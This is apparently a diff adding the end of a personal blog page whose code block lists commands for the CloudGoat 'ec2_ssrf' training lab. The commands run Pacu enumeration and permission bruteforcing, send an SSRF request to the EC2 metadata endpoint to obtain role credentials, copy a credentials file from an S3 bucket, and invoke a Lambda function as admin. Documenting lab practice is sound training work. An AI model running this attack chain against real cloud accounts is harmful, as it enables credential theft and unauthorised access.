+</span></span><span style="display:flex;"><span>cloudgoat create ec2_ssrf
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile solus
+</span></span><span style="display:flex;"><span>aws lambda list-functions --region us-east-1 --profile solus
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#EC2 Enumeration</span>
+</span></span><span style="display:flex;"><span>pacu
+</span></span><span style="display:flex;"><span>run iam__enum_permissions
+</span></span><span style="display:flex;"><span>run iam__bruteforce_permissions
+</span></span><span style="display:flex;"><span>run ec2__enum
+</span></span><span style="display:flex;"><span>exit 
+</span></span><span style="display:flex;"><span>aws ec2 describe-security-groups --region us-east-1 --profile solus_cred
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#SSRF Target</span>
+</span></span><span style="display:flex;"><span>http://3.228.5.64?url<span style="color:#f92672">=</span>http://169.254.169.254/latest/meta-data/cg-ec2-role-cgidnr0hwro0sg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate again</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Same commands as previus enumeration (no need for security groups though)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#S3 Bucket Attack</span>
+</span></span><span style="display:flex;"><span>aws s3 ls --profile ec2_ssrf
+</span></span><span style="display:flex;"><span>aws s3 ls s3://cg-secret-s3-bucket-cgidnr0hwro0sg --profile ec2_ssrf
+</span></span><span style="display:flex;"><span>aws s3 ls s3://cg-secret-s3-bucket-cgidnr0hwro0sg/aws/ --profile ec2_ssrf
+</span></span><span style="display:flex;"><span>aws s3 cp s3://cg-secret-s3-bucket-cgidnr0hwro0sg/aws/credentials . --profile ec2_ssrf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Lambda Invocation</span>
+</span></span><span style="display:flex;"><span>aws lambda invoke --function-name cg-lambda-cgidnr0hwro0sg output.json --profile admin
+</span></span></code></pre></div>
+  </div>
+</article>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+
+<script src="../../js/darkmode.js" defer></script>
+<footer class="bg-gray-900">
+    <div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8">
+        <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
+            
+            <div class="px-5 py-2">
+                <a href="http://localhost:1313/about/" class="text-base text-gray-400 hover:text-gray-300">About</a>
+            </div>
+            
+            <div class="px-5 py-2">
+                <a href="http://localhost:1313/posts" class="text-base text-gray-400 hover:text-gray-300">Posts</a>
+            </div>
+            
+        </nav>
+        <p class="mt-8 text-base text-center text-gray-400">&copy; 2025
+            Personal Portfolio. All rights
+            reserved.</p>
+        <p class="mt-2 text-base text-center text-gray-400">Theme made with &#x2764;&#xfe0f; by <a
+               href="https://nusserstudios.com" class="hover:underline hover:text-primary-600"><span
+                      class="font-black uppercase">Nusser</span> <span class="font-light uppercase">Studios.</span></a>
+        </p>
+    </div>
+</footer>
+</body>
+
+</html>
